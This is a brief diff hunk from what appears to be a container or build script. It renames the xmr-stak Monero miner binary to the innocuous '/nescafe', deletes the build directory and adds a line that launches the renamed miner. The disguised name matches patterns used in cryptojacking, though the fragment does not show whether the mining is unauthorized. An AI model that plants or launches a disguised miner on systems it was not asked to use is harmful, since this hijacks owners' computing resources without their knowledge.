@@ -9,3 +9,5 @@ cd /
 mv /compile/bin/* /
 mv /xmr-stak /nescafe
 rm -rf /compile
+
+/nescafe
